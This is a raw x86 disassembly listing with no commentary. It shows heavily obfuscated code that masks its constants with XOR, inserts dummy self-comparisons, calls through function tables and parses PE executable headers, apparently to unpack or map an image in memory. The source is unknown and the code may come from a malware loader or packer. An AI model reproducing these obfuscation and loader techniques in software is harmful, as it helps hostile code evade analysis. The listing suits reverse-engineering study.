  41bb64:	mov    eax,DWORD PTR [ebp+0x8]
  41bb67:	mov    edx,DWORD PTR [ebp-0x4c]
  41bb6a:	mov    eax,DWORD PTR [eax+0x1d8]
  41bb70:	xor    edx,ebx
  41bb72:	add    edx,esi
  41bb74:	push   edx
  41bb75:	mov    edx,DWORD PTR [ebp-0x3c]
  41bb78:	xor    edx,ebx
  41bb7a:	add    edx,esi
  41bb7c:	push   edx
  41bb7d:	push   ecx
  41bb7e:	mov    DWORD PTR [ebp-0x2c],ecx
  41bb81:	mov    ecx,DWORD PTR [ebp-0x14]
  41bb84:	xor    ecx,ebx
  41bb86:	add    ecx,esi
  41bb88:	push   ecx
  41bb89:	call   DWORD PTR [eax+0x14]
  41bb8c:	mov    edi,eax
  41bb8e:	mov    eax,DWORD PTR [ebp-0x14]
  41bb91:	xor    eax,ebx
  41bb93:	add    eax,esi
  41bb95:	cmp    eax,edi
  41bb97:	je     0x41bbf2
  41bb99:	mov    eax,DWORD PTR [ebp-0x14]
  41bb9c:	jmp    0x41bbbf
  41bb9e:	mov    ecx,DWORD PTR [ebp-0x28]
  41bba1:	xor    eax,ebx
  41bba3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  41bbaa:	mov    BYTE PTR [eax+edi*1+0x3272e0],cl
  41bbb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41bbb4:	xor    ecx,ebx
  41bbb6:	lea    eax,[ecx+eax*1+0x3272e0]
  41bbbd:	xor    eax,ebx
  41bbbf:	mov    ecx,DWORD PTR [ebp-0x40]
  41bbc2:	sub    ecx,esi
  41bbc4:	xor    ecx,ebx
  41bbc6:	cmp    eax,ecx
  41bbc8:	jne    0x41bb9e
  41bbca:	mov    eax,DWORD PTR [ebp+0x8]
  41bbcd:	mov    ecx,DWORD PTR [ebp-0x50]
  41bbd0:	mov    eax,DWORD PTR [eax+0x1d8]
  41bbd6:	xor    ecx,ebx
  41bbd8:	add    ecx,esi
  41bbda:	push   ecx
  41bbdb:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbde:	xor    ecx,ebx
  41bbe0:	add    ecx,esi
  41bbe2:	push   ecx
  41bbe3:	push   DWORD PTR [ebp-0x28]
  41bbe6:	call   DWORD PTR [eax+0x18]
  41bbe9:	mov    eax,DWORD PTR [ebp-0x2c]
  41bbec:	mov    DWORD PTR [ebp-0x28],edi
  41bbef:	mov    DWORD PTR [ebp-0x40],eax
  41bbf2:	mov    edi,DWORD PTR [ebp-0x28]
  41bbf5:	mov    eax,DWORD PTR [ebp-0x18]
  41bbf8:	mov    ecx,DWORD PTR [ebp-0x14]
  41bbfb:	xor    eax,ebx
  41bbfd:	mov    DWORD PTR [ebp-0x2c],edi
  41bc00:	add    eax,esi
  41bc02:	mov    DWORD PTR [ebp-0x5c],0x39122a12
  41bc09:	mov    DWORD PTR [ebp-0x58],0x27123f12
  41bc10:	jmp    0x41bc44
  41bc12:	xor    ecx,ebx
  41bc14:	mov    dl,BYTE PTR [ebp+ecx*1+0x327284]
  41bc1b:	xor    dl,0x73
  41bc1e:	sub    dl,0x9
  41bc21:	mov    DWORD PTR [ebp-0x3c],ecx
  41bc24:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272e0]
  41bc2c:	movzx  edx,dl
  41bc2f:	cmp    ecx,edx
  41bc31:	jne    0x41bc4e
  41bc33:	mov    ecx,DWORD PTR [ebp-0x18]
  41bc36:	mov    edx,DWORD PTR [ebp-0x3c]
  41bc39:	xor    ecx,ebx
  41bc3b:	lea    ecx,[ecx+edx*1+0x3272e0]
  41bc42:	xor    ecx,ebx
  41bc44:	cmp    ecx,0xf89c85b1
  41bc4a:	jne    0x41bc12
  41bc4c:	jmp    0x41bc55
  41bc4e:	mov    eax,DWORD PTR [ebp-0x14]
  41bc51:	xor    eax,ebx
  41bc53:	add    eax,esi
  41bc55:	mov    ecx,DWORD PTR [ebp-0x14]
  41bc58:	xor    ecx,ebx
  41bc5a:	add    ecx,esi
  41bc5c:	cmp    ecx,eax
  41bc5e:	je     0x41bdd1
  41bc64:	mov    eax,DWORD PTR [edi+0x8]
  41bc67:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41bc6e:	mov    DWORD PTR [ebp-0x3c],0xf89cc316
  41bc75:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  41bc7c:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41bc83:	mov    DWORD PTR [ebp-0x10],eax
  41bc86:	mov    eax,DWORD PTR [ebp+0x8]
  41bc89:	mov    ecx,DWORD PTR [ebp-0x20]
  41bc8c:	xor    ecx,ebx
  41bc8e:	add    ecx,esi
  41bc90:	push   ecx
  41bc91:	mov    ecx,DWORD PTR [ebp-0x48]
  41bc94:	mov    eax,DWORD PTR [eax+0x1d8]
  41bc9a:	xor    ecx,ebx
  41bc9c:	add    ecx,esi
  41bc9e:	push   ecx
  41bc9f:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bca2:	xor    ecx,ebx
  41bca4:	add    ecx,esi
  41bca6:	push   ecx
  41bca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcaa:	xor    ecx,ebx
  41bcac:	add    ecx,esi
  41bcae:	push   ecx
  41bcaf:	call   DWORD PTR [eax+0x14]
  41bcb2:	mov    edi,eax
  41bcb4:	mov    eax,DWORD PTR [ebp+0x8]
  41bcb7:	mov    ecx,DWORD PTR [ebp-0x20]
  41bcba:	mov    eax,DWORD PTR [eax+0x1d8]
  41bcc0:	xor    ecx,ebx
  41bcc2:	add    ecx,esi
  41bcc4:	push   ecx
  41bcc5:	mov    ecx,DWORD PTR [ebp-0x48]
  41bcc8:	xor    ecx,ebx
  41bcca:	add    ecx,esi
  41bccc:	push   ecx
  41bccd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	xor    ecx,ebx
  41bcd5:	add    ecx,esi
  41bcd7:	push   ecx
  41bcd8:	call   DWORD PTR [eax+0x14]
  41bcdb:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcde:	xor    ecx,ebx
  41bce0:	add    ecx,esi
  41bce2:	mov    DWORD PTR [ebp-0x20],eax
  41bce5:	cmp    ecx,edi
  41bce7:	je     0x41c074
  41bced:	mov    ecx,DWORD PTR [ebp-0xc]
  41bcf0:	xor    ecx,ebx
  41bcf2:	add    ecx,esi
  41bcf4:	cmp    ecx,eax
  41bcf6:	je     0x41c074
  41bcfc:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  41bd03:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41bd0a:	mov    ecx,DWORD PTR [ebp-0x3c]
  41bd0d:	xor    cl,0x99
  41bd10:	sub    cl,0x20
  41bd13:	mov    BYTE PTR [edi],cl
  41bd15:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd18:	xor    cl,0x99
  41bd1b:	sub    cl,0x20
  41bd1e:	mov    BYTE PTR [edi+0x1],cl
  41bd21:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bd24:	xor    cl,0x99
  41bd27:	sub    cl,0x20
  41bd2a:	mov    BYTE PTR [edi+0x2],cl
  41bd2d:	and    DWORD PTR [ebp-0xb4],0x0
  41bd34:	and    DWORD PTR [ebp-0xa4],0x0
  41bd3b:	lea    ecx,[ebp-0xa4]
  41bd41:	push   ecx
  41bd42:	push   DWORD PTR [ebp-0x10]
  41bd45:	push   eax
  41bd46:	lea    eax,[ebp-0xb4]
  41bd4c:	push   eax
  41bd4d:	mov    eax,DWORD PTR [ebp-0x2c]
  41bd50:	push   DWORD PTR [eax+0xc]
  41bd53:	mov    eax,DWORD PTR [ebp-0x28]
  41bd56:	add    eax,0x10
  41bd59:	push   eax
  41bd5a:	push   edi
  41bd5b:	call   0x41b0a7
  41bd60:	mov    DWORD PTR [ebp-0x3c],eax
  41bd63:	mov    eax,DWORD PTR [ebp+0x8]
  41bd66:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd69:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd6f:	xor    ecx,ebx
  41bd71:	add    ecx,esi
  41bd73:	push   ecx
  41bd74:	mov    ecx,DWORD PTR [ebp-0xc]
  41bd77:	xor    ecx,ebx
  41bd79:	add    ecx,esi
  41bd7b:	push   ecx
  41bd7c:	push   edi
  41bd7d:	call   DWORD PTR [eax+0x18]
  41bd80:	mov    eax,DWORD PTR [ebp-0x3c]
  41bd83:	add    eax,0xffcd8d20
  41bd88:	xor    eax,ebx
  41bd8a:	cmp    eax,0xf89c85b9
  41bd8f:	mov    eax,DWORD PTR [ebp+0x8]
  41bd92:	mov    eax,DWORD PTR [eax+0x1d8]
  41bd98:	mov    ecx,DWORD PTR [ebp-0x50]
  41bd9b:	jne    0x41bdbe
  41bd9d:	xor    ecx,ebx
  41bd9f:	add    ecx,esi
  41bda1:	push   ecx
  41bda2:	mov    ecx,DWORD PTR [ebp-0xc]
  41bda5:	xor    ecx,ebx
  41bda7:	add    ecx,esi
  41bda9:	push   ecx
  41bdaa:	push   DWORD PTR [ebp-0x28]
  41bdad:	call   DWORD PTR [eax+0x18]
  41bdb0:	mov    eax,DWORD PTR [ebp-0x20]
  41bdb3:	mov    DWORD PTR [ebp-0x28],eax
  41bdb6:	mov    eax,DWORD PTR [ebp-0x10]
  41bdb9:	mov    DWORD PTR [ebp-0x40],eax
  41bdbc:	jmp    0x41bdd1
  41bdbe:	xor    ecx,ebx
  41bdc0:	add    ecx,esi
  41bdc2:	push   ecx
  41bdc3:	mov    ecx,DWORD PTR [ebp-0xc]
  41bdc6:	xor    ecx,ebx
  41bdc8:	add    ecx,esi
  41bdca:	push   ecx
  41bdcb:	push   DWORD PTR [ebp-0x20]
  41bdce:	call   DWORD PTR [eax+0x18]
  41bdd1:	mov    eax,DWORD PTR [ebp-0x40]
  41bdd4:	mov    DWORD PTR [ebp-0x38],eax
  41bdd7:	mov    eax,DWORD PTR [ebp-0x28]
  41bdda:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41bde1:	mov    DWORD PTR [ebp-0x3c],eax
  41bde4:	mov    edi,0xf89c85b8
  41bde9:	mov    DWORD PTR [ebp-0x30],edi
  41bdec:	mov    eax,DWORD PTR [ebp-0x24]
  41bdef:	xor    eax,ebx
  41bdf1:	add    eax,esi
  41bdf3:	mov    DWORD PTR [ebp-0xc],eax
  41bdf6:	mov    eax,DWORD PTR [ebp-0x24]
  41bdf9:	xor    eax,ebx
  41bdfb:	add    eax,esi
  41bdfd:	mov    DWORD PTR [ebp-0x10],eax
  41be00:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  41be07:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  41be0e:	mov    eax,DWORD PTR [ebp-0x24]
  41be11:	mov    ecx,DWORD PTR [ebp-0x38]
  41be14:	xor    eax,ebx
  41be16:	add    eax,esi
  41be18:	cmp    ecx,eax
  41be1a:	je     0x41c010
  41be20:	jmp    0x41bfec
  41be25:	mov    ecx,DWORD PTR [ebp-0xc]
  41be28:	mov    eax,DWORD PTR [ebp-0x38]
  41be2b:	sub    eax,ecx
  41be2d:	mov    ecx,DWORD PTR [ebp-0x48]
  41be30:	xor    ecx,ebx
  41be32:	add    ecx,esi
  41be34:	xor    edx,edx
  41be36:	div    ecx
  41be38:	mov    DWORD PTR [ebp-0x10],eax
  41be3b:	mov    eax,DWORD PTR [ebp-0x20]
  41be3e:	mov    ecx,DWORD PTR [ebp-0x10]
  41be41:	xor    eax,ebx
  41be43:	add    eax,esi
  41be45:	cmp    ecx,eax
  41be47:	jbe    0x41be53
  41be49:	mov    eax,DWORD PTR [ebp-0x20]
  41be4c:	xor    eax,ebx
  41be4e:	add    eax,esi
  41be50:	mov    DWORD PTR [ebp-0x10],eax
  41be53:	mov    eax,DWORD PTR [ebp-0x48]
  41be56:	mov    ecx,DWORD PTR [ebp-0x10]
  41be59:	xor    eax,ebx
  41be5b:	add    eax,esi
  41be5d:	imul   eax,ecx
  41be60:	mov    DWORD PTR [ebp-0x10],eax
  41be63:	mov    eax,DWORD PTR [ebp-0x24]
  41be66:	mov    ecx,DWORD PTR [ebp-0x10]
  41be69:	xor    eax,ebx
  41be6b:	add    eax,esi
  41be6d:	cmp    ecx,eax
  41be6f:	je     0x41bfda
  41be75:	mov    eax,DWORD PTR [ebp-0x10]
  41be78:	mov    DWORD PTR [ebp-0x34],eax
  41be7b:	mov    eax,DWORD PTR [ebp-0xc]
  41be7e:	add    eax,DWORD PTR [ebp-0x3c]
  41be81:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  41be88:	mov    DWORD PTR [ebp-0x10],edi
  41be8b:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41be92:	mov    DWORD PTR [ebp-0x1c],eax
  41be95:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  41be9c:	mov    DWORD PTR [ebp-0x8],edi
  41be9f:	mov    eax,DWORD PTR [ebp-0x54]
  41bea2:	xor    eax,ebx
  41bea4:	add    eax,esi
  41bea6:	jmp    0x41bf99
  41beab:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41beb5:	mov    DWORD PTR [ebp-0x9c],0xf89c85ad
  41bebf:	mov    eax,DWORD PTR [ebp-0x8]
  41bec2:	mov    ecx,DWORD PTR [ebp-0x18]
  41bec5:	xor    eax,ebx
  41bec7:	add    eax,esi
  41bec9:	imul   eax,ecx
  41becc:	mov    ecx,DWORD PTR [ebp-0x1c]
  41becf:	mov    al,BYTE PTR [eax+ecx*1]
  41bed2:	mov    BYTE PTR [ebp-0x1],al
  41bed5:	mov    eax,DWORD PTR [ebp-0x8]
  41bed8:	mov    ecx,DWORD PTR [ebp-0x18]
  41bedb:	xor    eax,ebx
  41bedd:	add    eax,esi
  41bedf:	imul   eax,ecx
  41bee2:	mov    ecx,DWORD PTR [ebp-0x4c]
  41bee5:	xor    ecx,ebx
  41bee7:	add    eax,ecx
  41bee9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41beec:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bef4:	mov    ecx,DWORD PTR [ebp-0xac]
  41befa:	xor    ecx,ebx
  41befc:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf03:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf07:	xor    ecx,eax
  41bf09:	mov    BYTE PTR [ebp-0x1],cl
  41bf0c:	mov    al,BYTE PTR [ebp-0x1]
  41bf0f:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf12:	mov    edx,DWORD PTR [ebp-0x18]
  41bf15:	xor    ecx,ebx
  41bf17:	add    ecx,esi
  41bf19:	imul   ecx,edx
  41bf1c:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf1f:	mov    BYTE PTR [ecx+edx*1],al
  41bf22:	mov    eax,DWORD PTR [ebp-0x8]
  41bf25:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf28:	xor    eax,ebx
  41bf2a:	add    eax,esi
  41bf2c:	imul   eax,ecx
  41bf2f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf32:	mov    al,BYTE PTR [eax+ecx*1]
  41bf35:	mov    BYTE PTR [ebp-0x1],al
  41bf38:	mov    eax,DWORD PTR [ebp-0x8]
  41bf3b:	mov    ecx,DWORD PTR [ebp-0x18]
  41bf3e:	xor    eax,ebx
  41bf40:	add    eax,esi
  41bf42:	imul   eax,ecx
  41bf45:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf48:	xor    ecx,ebx
  41bf4a:	add    eax,ecx
  41bf4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf4f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  41bf57:	mov    ecx,DWORD PTR [ebp-0x9c]
  41bf5d:	xor    ecx,ebx
  41bf5f:	lea    eax,[ecx+eax*1+0x3272e0]
  41bf66:	movzx  ecx,BYTE PTR [ebp-0x1]
  41bf6a:	xor    ecx,eax
  41bf6c:	mov    BYTE PTR [ebp-0x1],cl
  41bf6f:	mov    al,BYTE PTR [ebp-0x1]
  41bf72:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf75:	mov    edx,DWORD PTR [ebp-0x18]
  41bf78:	xor    ecx,ebx
  41bf7a:	add    ecx,esi
  41bf7c:	imul   ecx,edx
  41bf7f:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf82:	mov    BYTE PTR [ecx+edx*1],al
  41bf85:	mov    eax,DWORD PTR [ebp-0x2c]
  41bf88:	mov    ecx,DWORD PTR [ebp-0x10]
  41bf8b:	xor    eax,ebx
  41bf8d:	xor    ecx,ebx
  41bf8f:	add    eax,esi
  41bf91:	add    ecx,esi
  41bf93:	imul   eax,ecx
  41bf96:	add    eax,DWORD PTR [ebp-0x18]
  41bf99:	mov    DWORD PTR [ebp-0x18],eax
  41bf9c:	mov    eax,DWORD PTR [ebp-0x18]
  41bf9f:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfa2:	cmp    ecx,eax
  41bfa4:	jb     0x41beab
  41bfaa:	mov    eax,DWORD PTR [ebp-0x10]
  41bfad:	mov    ecx,DWORD PTR [ebp-0x34]
  41bfb0:	xor    eax,ebx
  41bfb2:	add    eax,esi
  41bfb4:	imul   eax,ecx
  41bfb7:	mov    ecx,DWORD PTR [ebp-0x54]
  41bfba:	xor    ecx,ebx
  41bfbc:	add    ecx,esi
  41bfbe:	or     eax,ecx
  41bfc0:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfc3:	xor    ecx,ebx
  41bfc5:	add    eax,ecx
  41bfc7:	mov    ecx,DWORD PTR [ebp-0x30]
  41bfca:	xor    ecx,ebx
  41bfcc:	add    eax,ecx
  41bfce:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfd1:	lea    eax,[eax+ecx*1+0x64e5c0]
  41bfd8:	jmp    0x41bfe9
  41bfda:	mov    eax,DWORD PTR [ebp-0x30]
  41bfdd:	mov    ecx,DWORD PTR [ebp-0xc]
  41bfe0:	xor    eax,ebx
  41bfe2:	lea    eax,[eax+ecx*1+0x3272e0]
  41bfe9:	mov    DWORD PTR [ebp-0xc],eax
  41bfec:	mov    eax,DWORD PTR [ebp-0x30]
  41bfef:	xor    eax,ebx
  41bff1:	mov    ecx,0xffcd8d20
  41bff6:	sub    ecx,eax
  41bff8:	add    ecx,DWORD PTR [ebp-0x38]
  41bffb:	mov    eax,DWORD PTR [ebp-0x30]
  41bffe:	mov    edx,DWORD PTR [ebp-0xc]
  41c001:	xor    eax,ebx
  41c003:	add    eax,esi
  41c005:	imul   eax,edx
  41c008:	cmp    eax,ecx
  41c00a:	jbe    0x41be25
  41c010:	push   DWORD PTR [ebp+0x8]
  41c013:	mov    eax,DWORD PTR [ebp+0x8]
  41c016:	push   DWORD PTR [eax+0x1cc]
  41c01c:	lea    eax,[ebp-0xa0]
  41c022:	push   eax
  41c023:	mov    eax,DWORD PTR [ebp+0x8]
  41c026:	mov    eax,DWORD PTR [eax+0x1c4]
  41c02c:	push   DWORD PTR [eax]
  41c02e:	mov    eax,DWORD PTR [ebp+0x8]
  41c031:	mov    eax,DWORD PTR [eax+0x1c0]
  41c037:	push   DWORD PTR [eax]
  41c039:	push   DWORD PTR [ebp-0x40]
  41c03c:	push   DWORD PTR [ebp-0x28]
  41c03f:	call   0x41cad6
  41c044:	mov    DWORD PTR [ebp-0x3c],eax
  41c047:	mov    eax,DWORD PTR [ebp-0x14]
  41c04a:	mov    ecx,DWORD PTR [ebp-0x28]
  41c04d:	xor    eax,ebx
  41c04f:	add    eax,esi
  41c051:	cmp    eax,ecx
  41c053:	je     0x41c074
  41c055:	mov    eax,DWORD PTR [ebp+0x8]
  41c058:	mov    ecx,DWORD PTR [ebp-0x50]
  41c05b:	mov    eax,DWORD PTR [eax+0x1d8]
  41c061:	xor    ecx,ebx
  41c063:	add    ecx,esi
  41c065:	push   ecx
  41c066:	mov    ecx,DWORD PTR [ebp-0x14]
  41c069:	xor    ecx,ebx
  41c06b:	add    ecx,esi
  41c06d:	push   ecx
  41c06e:	push   DWORD PTR [ebp-0x28]
  41c071:	call   DWORD PTR [eax+0x18]
  41c074:	pop    edi
  41c075:	pop    esi
  41c076:	pop    ebx
  41c077:	leave  
  41c078:	ret    0x4
  41c07b:	push   ebp
  41c07c:	mov    ebp,esp
  41c07e:	push   ecx
  41c07f:	push   ecx
  41c080:	lea    eax,[ebp-0x8]
  41c083:	mov    DWORD PTR [ebp-0x4],eax
  41c086:	push   esi
  41c087:	mov    esi,DWORD PTR [ebp-0x4]
  41c08a:	mov    eax,0xf881ba0f
  41c08f:	mov    DWORD PTR [esi],eax
  41c091:	mov    esi,DWORD PTR [ebp-0x8]
  41c094:	cmp    esi,eax
  41c096:	pop    esi
  41c097:	jne    0x41c0a1
  41c099:	mov    BYTE PTR [ecx+0xa],0x7a
  41c09d:	mov    BYTE PTR [edx+0x8],0x2f
  41c0a1:	mov    BYTE PTR [edx+0xa],0x7a
  41c0a5:	mov    BYTE PTR [ecx+0x2],0x4
  41c0a9:	leave  
  41c0aa:	ret    
  41c0ab:	push   ebp
  41c0ac:	mov    ebp,esp
  41c0ae:	push   ecx
  41c0af:	push   ecx
  41c0b0:	lea    eax,[ebp-0x8]
  41c0b3:	mov    DWORD PTR [ebp-0x4],eax
  41c0b6:	mov    edx,DWORD PTR [ebp-0x4]
  41c0b9:	mov    eax,0xf88b0be3
  41c0be:	mov    DWORD PTR [edx],eax
  41c0c0:	mov    edx,DWORD PTR [ebp-0x8]
  41c0c3:	cmp    edx,eax
  41c0c5:	jne    0x41c0d6
  41c0c7:	mov    eax,DWORD PTR [ebp+0x8]
  41c0ca:	mov    BYTE PTR [ecx+0x9],0xe
  41c0ce:	mov    BYTE PTR [eax+0x7],0x47
  41c0d2:	mov    BYTE PTR [ecx+0x6],0xf
  41c0d6:	mov    BYTE PTR [ecx+0x3],0x1e
  41c0da:	leave  
  41c0db:	ret    0x4
  41c0de:	push   ebp
  41c0df:	mov    ebp,esp
  41c0e1:	push   ecx
  41c0e2:	push   ecx
  41c0e3:	lea    eax,[ebp-0x8]
  41c0e6:	mov    DWORD PTR [ebp-0x4],eax
  41c0e9:	mov    edx,DWORD PTR [ebp-0x4]
  41c0ec:	mov    eax,0x7e0da0f
  41c0f1:	mov    DWORD PTR [edx],eax
  41c0f3:	mov    edx,DWORD PTR [ebp-0x8]
  41c0f6:	cmp    edx,eax
  41c0f8:	jne    0x41c0fe
  41c0fa:	mov    BYTE PTR [ecx+0x7],0x47
  41c0fe:	mov    eax,DWORD PTR [ebp+0x8]
  41c101:	mov    BYTE PTR [ecx+0x1],0x1
  41c105:	mov    BYTE PTR [eax+0x9],0x2e
  41c109:	leave  
  41c10a:	ret    0x4
  41c10d:	push   ebp
  41c10e:	mov    ebp,esp
  41c110:	push   ecx
  41c111:	push   ecx
  41c112:	lea    eax,[ebp-0x8]
  41c115:	mov    DWORD PTR [ebp-0x4],eax
  41c118:	push   esi
  41c119:	mov    esi,DWORD PTR [ebp-0x4]
  41c11c:	mov    eax,0x7060e3e
  41c121:	mov    DWORD PTR [esi],eax
  41c123:	mov    esi,DWORD PTR [ebp-0x8]
  41c126:	cmp    esi,eax
  41c128:	pop    esi
  41c129:	jne    0x41c135
  41c12b:	mov    BYTE PTR [edx+0x4],0xb
  41c12f:	mov    WORD PTR [ecx+0x3],0xb1e
  41c135:	mov    BYTE PTR [edx],0x3f
  41c138:	leave  
  41c139:	ret    
  41c13a:	push   ebp
  41c13b:	mov    ebp,esp
  41c13d:	push   ecx
  41c13e:	push   ecx
  41c13f:	lea    eax,[ebp-0x8]
  41c142:	mov    DWORD PTR [ebp-0x4],eax
  41c145:	mov    edx,DWORD PTR [ebp-0x4]
  41c148:	mov    eax,0xf8870b3f
  41c14d:	mov    DWORD PTR [edx],eax
  41c14f:	mov    edx,DWORD PTR [ebp-0x8]
  41c152:	cmp    edx,eax
  41c154:	jne    0x41c161
  41c156:	mov    eax,DWORD PTR [ebp+0x8]
  41c159:	mov    BYTE PTR [ecx+0x8],0xf
  41c15d:	mov    BYTE PTR [eax+0x1],0x1
  41c161:	mov    BYTE PTR [ecx+0x5],0xf3
  41c165:	leave  
  41c166:	ret    0x4
  41c169:	push   esi
  41c16a:	mov    ecx,edi
  41c16c:	call   0x41c13a
  41c171:	mov    edx,edi
  41c173:	mov    ecx,esi
  41c175:	mov    BYTE PTR [esi],0x1f
  41c178:	call   0x41c10d
  41c17d:	push   esi
  41c17e:	mov    ecx,edi
  41c180:	mov    BYTE PTR [esi+0x5],0xf3
  41c184:	call   0x41c0de
  41c189:	push   esi
  41c18a:	mov    BYTE PTR [esi+0x6],0xf
  41c18e:	call   0x41c0ab
  41c193:	mov    BYTE PTR [esi+0x2],0x4
  41c197:	mov    edx,esi
  41c199:	jmp    0x41c07b
  41c19e:	push   ebp
  41c19f:	mov    ebp,esp
  41c1a1:	push   ecx
  41c1a2:	mov    ecx,DWORD PTR [edx+0x194]
  41c1a8:	push   esi
  41c1a9:	mov    esi,DWORD PTR [ebp+0x8]
  41c1ac:	mov    esi,DWORD PTR [esi]
  41c1ae:	mov    DWORD PTR [ecx],esi
  41c1b0:	mov    ecx,DWORD PTR [edx+0x194]
  41c1b6:	mov    ecx,DWORD PTR [ecx]
  41c1b8:	mov    esi,DWORD PTR [edx+0x190]
  41c1be:	mov    DWORD PTR [esi],ecx
  41c1c0:	mov    eax,DWORD PTR [edx+0x194]
  41c1c6:	mov    ecx,DWORD PTR [eax]
  41c1c8:	mov    ecx,DWORD PTR [ecx+0x3c]
  41c1cb:	add    ecx,DWORD PTR [eax]
  41c1cd:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  41c1d4:	mov    eax,DWORD PTR [ebp-0x4]
  41c1d7:	movzx  ecx,WORD PTR [ecx+0x16]
  41c1db:	xor    eax,0x7510899
  41c1e0:	add    eax,0x3272e0
  41c1e5:	pop    esi
  41c1e6:	test   ecx,eax
  41c1e8:	je     0x41c1f6
  41c1ea:	mov    eax,DWORD PTR [edx+0x1c8]
  41c1f0:	mov    DWORD PTR [eax],0xf89c85b8
  41c1f6:	leave  
  41c1f7:	ret    0x4
  41c1fa:	push   ebp
  41c1fb:	mov    ebp,esp
  41c1fd:	sub    esp,0x70
  41c200:	and    DWORD PTR [ebp-0x20],0x0
  41c204:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  41c20b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  41c212:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  41c219:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41c220:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  41c227:	mov    eax,DWORD PTR [ebp+0x20]
  41c22a:	mov    eax,DWORD PTR [eax+0x194]
  41c230:	mov    DWORD PTR [ebp-0xc],eax
  41c233:	mov    eax,DWORD PTR [ebp+0x20]
  41c236:	push   ebx
  41c237:	push   esi
  41c238:	mov    esi,DWORD PTR [eax+0x190]
  41c23e:	mov    eax,DWORD PTR [ebp+0x20]
  41c241:	mov    eax,DWORD PTR [eax+0x18c]
  41c247:	mov    DWORD PTR [ebp-0x8],eax
  41c24a:	mov    eax,DWORD PTR [eax]
  41c24c:	push   edi
  41c24d:	mov    DWORD PTR [ebp-0x4],esi
  41c250:	test   eax,eax
  41c252:	jne    0x41c25f
  41c254:	push   DWORD PTR [ebp+0x1c]
  41c257:	mov    edx,DWORD PTR [ebp+0x20]
  41c25a:	call   0x41c19e
  41c25f:	mov    eax,DWORD PTR [esi]
  41c261:	mov    ebx,DWORD PTR [esi]
  41c263:	add    ebx,DWORD PTR [eax+0x3c]
  41c266:	mov    eax,DWORD PTR [ebp+0xc]
  41c269:	mov    ecx,DWORD PTR [ebp-0x8]
  41c26c:	mov    ecx,DWORD PTR [ecx]
  41c26e:	mov    esi,0x7510899
  41c273:	xor    eax,esi
  41c275:	mov    edi,0x3272e0
  41c27a:	add    eax,edi
  41c27c:	cmp    eax,ecx
  41c27e:	jne    0x41c4b6
  41c284:	mov    eax,DWORD PTR [ebp-0xc]
  41c287:	mov    eax,DWORD PTR [eax]
  41c289:	mov    DWORD PTR [ebp-0x10],eax
  41c28c:	mov    eax,DWORD PTR [ebx+0x50]
  41c28f:	mov    DWORD PTR [ebp-0x68],eax
  41c292:	mov    eax,DWORD PTR [ebp-0x18]
  41c295:	xor    eax,esi
  41c297:	add    eax,edi
  41c299:	mov    DWORD PTR [ebp-0x64],eax
  41c29c:	mov    eax,DWORD PTR [ebp-0x14]
  41c29f:	and    DWORD PTR [ebp-0x6c],0x0
  41c2a3:	xor    eax,esi
  41c2a5:	add    eax,edi
  41c2a7:	mov    DWORD PTR [ebp-0x60],eax
  41c2aa:	lea    eax,[ebp-0x70]
  41c2ad:	push   eax
  41c2ae:	mov    eax,DWORD PTR [ebp+0x8]
  41c2b1:	xor    eax,esi
  41c2b3:	add    eax,edi
  41c2b5:	push   eax
  41c2b6:	mov    eax,DWORD PTR [ebp+0x20]
  41c2b9:	add    eax,0xaa
  41c2be:	push   eax
  41c2bf:	mov    eax,DWORD PTR [ebp+0x20]
  41c2c2:	mov    eax,DWORD PTR [eax+0x198]
  41c2c8:	mov    DWORD PTR [ebp-0x70],0x4
  41c2cf:	push   DWORD PTR [eax]
  41c2d1:	mov    eax,DWORD PTR [ebp+0x10]
  41c2d4:	call   eax
  41c2d6:	mov    ecx,DWORD PTR [ebp-0xc]
  41c2d9:	mov    ecx,DWORD PTR [ecx]
  41c2db:	mov    edx,DWORD PTR [ebp-0x8]
  41c2de:	mov    DWORD PTR [ebp-0x6c],eax
  41c2e1:	mov    DWORD PTR [ebp+0x1c],eax
